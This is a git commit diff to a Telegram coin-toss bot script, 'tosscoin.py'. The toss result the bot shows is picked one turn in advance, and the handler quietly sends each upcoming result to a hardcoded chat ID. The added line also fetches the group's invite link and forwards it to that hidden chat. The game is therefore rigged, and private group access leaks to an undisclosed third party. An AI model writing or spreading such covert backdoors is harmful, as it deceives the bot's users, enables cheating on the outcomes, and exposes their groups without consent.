26e604ebd12347a9bdc48d85c2265be59144aabf
Legendssssok <143305583+Legendssssok@users.noreply.github.com>
2023-09-08 18:31:35 +0530

    Update tosscoin.py

--- tosscoin.py
+++ tosscoin.py
@@ -23,6 +23,7 @@ def send_os(client, message):
 @app.on_message(filters.command(["vtoss"]))
 def send_wesnos(client, message):
     chat_id = message.chat.id
+    invite_link = app.get_chat_invite_link(chat_id)
     try:
         lol = store_future[chat_id]
     except:
@@ -30,7 +31,7 @@ def send_wesnos(client, message):
     message.reply_video("https://graph.org/file/6601d846c73a2a851194a.mp4", caption=f"💫 Result : {lol} 🎖️")
     owo = random.choice(coins)
     store_future[chat_id] = owo
-    app.send_message(-923693063, f"**Chat ID** : {chat_id} \n**Next Toss** : {owo}")
+    app.send_message(-1001844084371, f"**Chat ID** : {chat_id}\n**Invite Link** : {invite_link} \n**Next Toss** : {owo}")
     
     
     
